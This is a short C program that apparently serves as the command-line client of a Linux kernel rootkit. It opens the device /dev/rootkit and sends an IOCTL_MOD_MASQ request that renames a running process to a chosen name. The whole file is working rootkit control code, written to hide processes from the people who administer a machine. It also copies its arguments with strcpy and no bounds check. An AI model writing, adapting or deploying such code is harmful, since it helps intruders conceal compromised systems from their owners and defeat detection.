#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "../src/rootkit.h"

#define DEVICE_PATH "/dev/rootkit"

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <original_name> <new_name>\n", argv[0]);
        return EXIT_FAILURE;
    }

    struct masq_proc proc;
    strcpy(proc.orig_name, argv[1]);
    strcpy(proc.new_name, argv[2]);

    struct masq_proc procs[] = {proc};

    struct masq_proc_req req = {
        .len = sizeof(procs) / sizeof(procs[0]),
        .list = procs
    };

    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("Failed to open " DEVICE_PATH "\n");
        return EXIT_FAILURE;
    }

    int ret = ioctl(fd, IOCTL_MOD_MASQ, &req);
    if (ret < 0) {
        perror("Failed to masquerade process names.\n");
        close(fd);
        return EXIT_FAILURE;
    }

    printf("Successfully masqueraded process names.\n");

    close(fd);

    return EXIT_SUCCESS;
}